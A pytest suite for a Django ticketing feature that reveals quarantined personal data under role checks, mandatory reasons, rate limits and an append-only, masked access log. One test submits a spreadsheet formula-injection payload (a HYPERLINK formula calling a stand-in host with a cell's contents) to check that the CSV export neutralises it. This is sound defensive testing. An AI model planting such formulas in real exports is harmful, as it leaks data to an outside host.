"""Revealing quarantined PII: one value, one reason, one access-log row (F5)."""

from __future__ import annotations

import json
import logging
from datetime import timedelta
from pathlib import Path

import pytest
from django.conf import settings
from django.db import DatabaseError, connection, transaction
from django.utils import timezone

from apps.accounts.models import User, UserRole
from apps.audit.models import AuditLog
from apps.review.models import ReviewItem
from apps.tickets.models import PiiAccessLog, PiiQuarantine, Ticket
from apps.tickets.utils.crypto import build_quarantine_entries
from apps.tickets.utils.patterns import PIILevel
from apps.tickets.utils.router import ReviewQueue

CCCD = "001203004567"
PASSWORD = "Abc@12345"
URL = "/api/tickets/TKT-2026-000412/quarantine/reveal"
REASON = "Đối chiếu CCCD với hồ sơ nhân sự trước khi mở khoá tài khoản"


def user(username: str, role: UserRole) -> User:
    return User.objects.create_user(username=username, password="x", role=role.value)


@pytest.fixture
def people(db) -> dict[str, User]:
    return {
        "lan": user("lan.nt", UserRole.EMPLOYEE),
        "duc": user("duc.tm", UserRole.TECHNICIAN),
        "mai": user("mai.bn", UserRole.TECHNICIAN),
        "huy": user("huy.pq", UserRole.MANAGER),
        "anh": user("anh.lh", UserRole.SECURITY),
    }


@pytest.fixture
def ticket(people) -> Ticket:
    """TKT-2026-000412 with [CCCD_1] and [PASSWORD_1] quarantined for 30 more hours,
    and a low_confidence review item claimed by duc.tm."""
    entries = build_quarantine_entries({"[CCCD_1]": CCCD, "[PASSWORD_1]": PASSWORD})
    owner = Ticket.objects.create(
        public_id="TKT-2026-000412",
        reporter=people["lan"],
        subject_masked="Không vào được AWS access portal, báo sai mật khẩu",
        body_masked="Em là [EMPLOYEE_CODE_1], CCCD [CCCD_1]. Mật khẩu cũ [PASSWORD_1]",
        pii_level=PIILevel.CRITICAL.value,
        pii_map={ph: str(e.ref) for ph, e in entries.items()},
    )
    PiiQuarantine.objects.store(owner, entries)
    PiiQuarantine.objects.filter(ticket=owner).update(
        expires_at=timezone.now() + timedelta(hours=30)
    )
    item = ReviewItem.objects.create(ticket=owner, queue=ReviewQueue.LOW_CONFIDENCE.value)
    item.claim(people["duc"])
    return owner


def reveal(api_as, actor: User, placeholder: str = "[CCCD_1]", reason: str = REASON, **extra):
    body = {"placeholder": placeholder, "reason_code": "verify_identity", "reason": reason}
    return api_as(actor).post(URL, {**body, **extra}, content_type="application/json")


def events(name: str) -> list[AuditLog]:
    return list(AuditLog.objects.filter(event=name))


def test_reveal_writes_exactly_one_access_log_row(api_as, people, ticket):
    """AC-F5-01: the claim holder sees the value; one log row, one audit row without it."""
    response = reveal(api_as, people["duc"])

    assert response.status_code == 200
    assert response.json()["value"] == CCCD
    row = PiiAccessLog.objects.get()
    assert (row.actor, row.placeholder, row.reason_code) == (
        people["duc"],
        "[CCCD_1]",
        "verify_identity",
    )
    assert row.review_item == ReviewItem.objects.get()
    (audit,) = events("pii_revealed")
    assert audit.payload == {
        "placeholder": "[CCCD_1]",
        "reason_code": "verify_identity",
        "access_log": str(row.id),
    }


def test_empty_reason_is_refused_without_a_log_row(api_as, people, ticket):
    """AC-F5-02."""
    response = reveal(api_as, people["duc"], reason="")

    assert response.status_code == 422
    assert response.json()["code"] == "reason_required"
    assert not PiiAccessLog.objects.exists()


def test_technician_without_claim_or_assignment_is_refused(api_as, people, ticket):
    """AC-F5-03."""
    response = reveal(api_as, people["mai"])

    assert response.status_code == 403
    assert response.json()["code"] == "reveal_not_allowed"
    assert not PiiAccessLog.objects.exists()


def test_the_assignee_may_reveal(api_as, people, ticket):
    """BR-F5-01: the ticket's assignee needs no claim."""
    ticket.assigned_to = people["mai"]
    ticket.save(update_fields=["assigned_to"])

    response = reveal(api_as, people["mai"])

    assert response.status_code == 200
    assert PiiAccessLog.objects.get().review_item is None


def test_a_resolved_claim_does_not_grant_a_reveal(api_as, people, ticket):
    """BR-F5-01: only a claim still open counts."""
    ReviewItem.objects.update(state="resolved")

    assert reveal(api_as, people["duc"]).status_code == 403


@pytest.mark.parametrize("who", ["lan", "huy"])
def test_employees_and_managers_are_refused_at_the_route(api_as, people, ticket, who):
    """§7.1: reveal is for a technician (claim holder or assignee) or security."""
    response = reveal(api_as, people[who])

    assert response.status_code == 403
    assert response.json()["code"] == "role_not_allowed"


def test_critical_label_needs_security(api_as, people, ticket):
    """AC-F5-04."""
    refused = reveal(api_as, people["duc"], "[PASSWORD_1]")
    allowed = reveal(api_as, people["anh"], "[PASSWORD_1]", reason_code="security_investigation")

    assert refused.status_code == 403
    assert refused.json()["code"] == "critical_needs_security"
    assert allowed.status_code == 200
    assert allowed.json()["value"] == PASSWORD


def test_unknown_placeholder_is_not_found(api_as, people, ticket):
    response = reveal(api_as, people["anh"], "[EMAIL_9]")

    assert response.status_code == 404
    assert response.json()["code"] == "placeholder_not_found"


def test_expired_entry_is_gone(api_as, people, ticket):
    """AC-F5-05: a row past expires_at, not yet deleted by the hourly task."""
    PiiQuarantine.objects.update(expires_at=timezone.now() - timedelta(minutes=1))

    response = reveal(api_as, people["anh"])

    assert response.status_code == 410
    assert response.json()["code"] == "quarantine_expired"
    assert not PiiAccessLog.objects.exists()


def test_a_value_the_expiry_task_deleted_is_gone(api_as, people, ticket):
    """FR-F5-006: the placeholder stays on the ticket after its row is deleted."""
    PiiQuarantine.objects.all().delete()

    assert reveal(api_as, people["anh"]).status_code == 410


def test_no_plaintext_when_access_log_insert_fails(api_as, people, ticket, monkeypatch):
    """AC-F5-06: a failed log insert returns no value and leaves no row."""

    def fail(**kwargs):
        raise DatabaseError("insert refused")

    monkeypatch.setattr(PiiAccessLog.objects, "create", fail)

    response = reveal(api_as, people["anh"])

    assert response.status_code == 500
    assert response.json()["code"] == "access_log_failed"
    assert CCCD not in response.content.decode()
    assert not PiiAccessLog.objects.exists()
    assert len(events("pii_reveal_failed")) == 1
    assert len(events("security_alert")) == 1


def test_a_decrypt_failure_rolls_back_the_log_row(api_as, people, ticket):
    """UC-F5-01 4y: the log row is rolled back; the failure is audited and alerts security."""
    PiiQuarantine.objects.update(ciphertext=b"not a ciphertext")

    response = reveal(api_as, people["anh"])

    assert response.status_code == 500
    assert response.json()["code"] == "decrypt_failed"
    assert not PiiAccessLog.objects.exists()
    assert not events("pii_revealed")
    assert [e.payload["reason"] for e in events("security_alert")] == ["decrypt_failed"]


def test_rate_limit_refuses_and_alerts_security(api_as, people, ticket):
    """AC-F5-07: the 21st reveal in an hour is refused; security is alerted once."""
    limit = settings.THRESHOLDS.pii_reveal.max_per_user_per_hour
    for _ in range(limit):
        PiiAccessLog.objects.create(
            ref=ticket.pii_map["[CCCD_1]"],
            actor=people["anh"],
            ticket=ticket,
            placeholder="[CCCD_1]",
            reason_code="security_investigation",
            reason="earlier reveal",
        )

    first = reveal(api_as, people["anh"])
    second = reveal(api_as, people["anh"])

    assert first.status_code == second.status_code == 429
    assert first.json()["code"] == "reveal_rate_limited"
    (alert,) = events("security_alert")
    assert alert.payload["reason"] == "reveal_rate_limited"
    assert PiiAccessLog.objects.count() == limit


def test_reason_with_a_secret_is_refused(api_as, people, ticket):
    """AC-F5-08."""
    response = reveal(api_as, people["duc"], reason="mật khẩu: Abc@12345 để thử đăng nhập")

    assert response.status_code == 422
    assert response.json()["code"] == "reason_has_secret"
    assert not PiiAccessLog.objects.exists()


def test_the_reason_is_stored_masked(api_as, people, ticket):
    """BR-F5-04, BR-X-06: the regex tier masks the reason before it is stored."""
    reveal(api_as, people["duc"], reason="Gọi lại theo số 0912345678 để xác minh")

    assert PiiAccessLog.objects.get().reason == "Gọi lại theo số [PHONE_VN_1] để xác minh"


def test_access_log_rejects_update_and_delete(api_as, people, ticket):
    """AC-F5-09."""
    reveal(api_as, people["duc"])

    for sql in ("UPDATE pii_access_log SET reason = 'x'", "DELETE FROM pii_access_log"):
        with pytest.raises(DatabaseError, match="append-only"):
            with transaction.atomic(), connection.cursor() as cursor:
                cursor.execute(sql)
    assert PiiAccessLog.objects.get().reason == REASON


def test_revealed_value_absent_from_logs(api_as, people, ticket, caplog):
    """AC-F5-10: the value is only in the response body, which is not cached."""
    caplog.set_level(logging.DEBUG)

    response = reveal(api_as, people["duc"])
    exported = api_as(people["anh"]).get("/api/pii/access-log.csv")

    assert response["Cache-Control"] == "no-store"
    assert CCCD not in caplog.text
    assert CCCD not in json.dumps([a.payload for a in AuditLog.objects.all()], ensure_ascii=False)
    assert CCCD not in exported.content.decode()
    assert CCCD not in URL


class TestAccessLog:
    def test_security_lists_rows_without_values(self, api_as, people, ticket):
        """FR-F5-009: filters by ticket, actor and reason code."""
        reveal(api_as, people["duc"])
        reveal(api_as, people["anh"], reason_code="security_investigation")
        client = api_as(people["anh"])

        everything = client.get("/api/pii/access-log").json()
        by_duc = client.get("/api/pii/access-log?actor=duc.tm").json()
        by_reason = client.get("/api/pii/access-log?reason_code=security_investigation").json()

        assert everything["count"] == 2
        assert [r["actor"] for r in by_duc["items"]] == ["duc.tm"]
        assert [r["actor"] for r in by_reason["items"]] == ["anh.lh"]
        assert {r["ticket"] for r in everything["items"]} == {"TKT-2026-000412"}
        assert "value" not in everything["items"][0]
        assert everything["items"][0]["level"] == "sensitive"

    def test_a_time_range_filters_the_rows(self, api_as, people, ticket):
        reveal(api_as, people["duc"])
        client = api_as(people["anh"])
        tomorrow = (timezone.now() + timedelta(days=1)).date().isoformat()

        assert client.get(f"/api/pii/access-log?from={tomorrow}").json()["count"] == 0
        assert client.get(f"/api/pii/access-log?to={tomorrow}").json()["count"] == 1

    def test_export_is_csv_and_audited(self, api_as, people, ticket):
        """UC-F5-02: the export carries metadata only and is audited."""
        reveal(api_as, people["duc"])

        exported = api_as(people["anh"]).get("/api/pii/access-log.csv?ticket=TKT-2026-000412")

        lines = exported.content.decode().splitlines()
        assert exported["Content-Type"].startswith("text/csv")
        assert lines[0].startswith("accessed_at,actor,ticket,placeholder")
        assert "duc.tm,TKT-2026-000412,[CCCD_1],verify_identity" in lines[1]
        (audit,) = events("pii_access_log_exported")
        assert audit.payload == {"filters": {"ticket": "TKT-2026-000412"}, "rows": 1}

    @pytest.mark.parametrize("who", ["duc", "huy"])
    @pytest.mark.parametrize("path", ["/api/pii/access-log", "/api/pii/access-log.csv"])
    def test_only_security_reads_the_log(self, api_as, people, who, path):
        assert api_as(people[who]).get(path).status_code == 403


def test_decrypt_has_one_caller():
    """FR-F5-010: only the reveal service calls crypto.decrypt."""
    root = Path(settings.BASE_DIR)
    callers = {
        str(path.relative_to(root))
        for path in root.rglob("*.py")
        if "tests" not in path.parts
        and ".venv" not in path.parts
        and "decrypt(" in path.read_text()
    }

    assert callers == {"apps/tickets/utils/crypto.py", "apps/tickets/utils/pii_reveal.py"}


def test_the_ticket_detail_lists_placeholders_with_their_level(api_as, people, ticket):
    """The reveal dialog marks a credential as security-only from this list."""
    detail = api_as(people["duc"]).get("/api/tickets/TKT-2026-000412/detail").json()

    assert detail["pii_placeholders"] == [
        {"placeholder": "[CCCD_1]", "level": "sensitive"},
        {"placeholder": "[PASSWORD_1]", "level": "critical"},
    ]


def test_a_refused_reveal_is_audited_without_a_value(api_as, people, ticket):
    """Spec §g: refusals go to audit_log, with the code and placeholder only."""
    reveal(api_as, people["mai"])

    (refused,) = events("pii_reveal_refused")
    assert refused.payload == {"reason": "reveal_not_allowed", "placeholder": "[CCCD_1]"}
    assert refused.actor_id == people["mai"].id


def test_refused_attempts_count_toward_the_hourly_limit(api_as, people, ticket, settings):
    """BR-F5-07: probing with refused reveals runs into the same limit."""
    limit = settings.THRESHOLDS.pii_reveal.max_per_user_per_hour
    for _ in range(limit):
        reveal(api_as, people["duc"], "[PASSWORD_1]")

    response = reveal(api_as, people["duc"])

    assert response.status_code == 429
    assert not PiiAccessLog.objects.exists()
    assert [a.payload["reason"] for a in events("security_alert")] == ["reveal_rate_limited"]


def test_the_export_neutralises_spreadsheet_formulas(api_as, people, ticket):
    """A reason a spreadsheet would run as a formula is exported as text."""
    reveal(api_as, people["duc"], reason='=HYPERLINK("https://x.example/?"&B2,"ok") lookup')

    exported = api_as(people["anh"]).get("/api/pii/access-log.csv").content.decode()

    assert ",'=HYPERLINK(" in exported.replace('"', "")
    assert ",=HYPERLINK(" not in exported.replace('"', "")


def test_retrying_while_limited_doesnt_extend_the_limit(api_as, people, ticket, settings):
    """BR-F5-07: the rate-limit refusals themselves don't count toward the limit."""
    limit = settings.THRESHOLDS.pii_reveal.max_per_user_per_hour
    for reason in ["reveal_not_allowed"] * (limit - 1) + ["reveal_rate_limited"] * 5:
        AuditLog.objects.record(
            "pii_reveal_refused",
            actor_type="human",
            actor_id=people["duc"].id,
            payload={"reason": reason, "placeholder": "[CCCD_1]"},
        )

    assert reveal(api_as, people["duc"]).status_code == 200
